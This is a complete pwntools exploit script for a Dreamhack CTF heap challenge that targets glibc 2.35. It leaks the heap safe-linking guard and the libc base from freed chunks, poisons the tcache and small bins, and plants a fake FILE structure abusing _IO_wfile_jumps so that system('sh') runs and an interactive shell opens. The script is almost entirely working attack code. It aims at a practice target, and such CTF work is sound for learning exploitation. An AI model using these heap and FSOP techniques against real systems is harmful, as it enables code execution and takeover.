#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./main')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 8296".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

def get_cat(idx):
    sla(b'Enter your choice: ', b'1')
    sla(b':', str(idx).encode())

def see_cat(idx):
    sla(b'Enter your choice: ', b'2')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x90)

def pet_cat(idx, v):
    sla(b'Enter your choice: ', b'3')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_cat(idx):
    sla(b'Enter your choice: ', b'4')
    sla(b':', str(idx).encode())

def get_dog(idx):
    sla(b'Enter your choice: ', b'5')
    sla(b':', str(idx).encode())

def see_dog(idx):
    sla(b'Enter your choice: ', b'6')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x100)

def pet_dog(idx, v):
    sla(b'Enter your choice: ', b'7')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_dog(idx):
    sla(b'Enter your choice: ', b'8')
    sla(b':', str(idx).encode())

# libc6_2.35-0ubuntu3.9_amd64
main_arena = 0x21ace0

# one for the guard lol
for i in range(9):
    get_cat(i)

for i in range(3, 9):
    rel_cat(i)

rel_cat(1)

# leak heap guard
guard = u64(see_cat(3)[:8].ljust(8, b'\x00'))
chunk = u64(see_cat(4)[:8].ljust(8, b'\x00')) ^ guard

slog("heap guard", guard)
slog("chunk addr", chunk)

# unsortedbin
# main_arena->cat2->cat0->main_arena
rel_cat(0)
rel_cat(2)

leak = u64(see_cat(0)[:8].ljust(8, b'\x00'))
lb = leak - main_arena
libc.address = lb
slog("libc_base", lb)

get_dog(0) # smallbin에 0, 2 들어가고

gdb.attach(p)
pause()

smallbin = u64(see_cat(0)[:8].ljust(8, b'\x00'))
slog("smallbin_entry", smallbin) # 재활용해서 주소 가져옴

get_cat(1)
get_cat(9)

pet_cat(1, p64(chunk-0x1f0) + p64(chunk-0xb0))

rel_cat(0)
rel_cat(2)
get_cat(0)
get_cat(2)

pet_cat(2, p64(smallbin) + p64(chunk - 0x150))
pet_cat(0, p64(chunk + 0x150) + p64(smallbin))

for i in range(3, 8):
    get_cat(i)

get_cat(10)

pet_cat(0, p64(0x404080 ^ guard))

get_cat(11)
get_cat(12)

stdout = chunk + 0x4d0
wfile = libc.sym["_IO_wfile_jumps"]
system = libc.sym["system"]
lock = lb + 0x21ca70
buf = lb + 0x21b803

fake = b"  sh\x00\x00\x00\x00"
fake += p64(0)
fake += p64(buf) * 2
fake += p64(0) * 2
fake += p64(0) * 7
fake += p64(system)
fake += p64(1)
fake += p64(0xffffffffffffffff)
fake += p64(0)
fake += p64(lock)
fake += p64(0xffffffffffffffff)
fake += p64(0)
fake += p64(stdout - 0x10)
fake += p64(0) * 3
fake += p64(0) # <= 0
fake += p64(0)
fake += p64(stdout)
fake += p64(wfile - 0x20)

get_dog(1)
pet_dog(1, fake)
pet_cat(12, p64(chunk + 0x4d0))

p.interactive()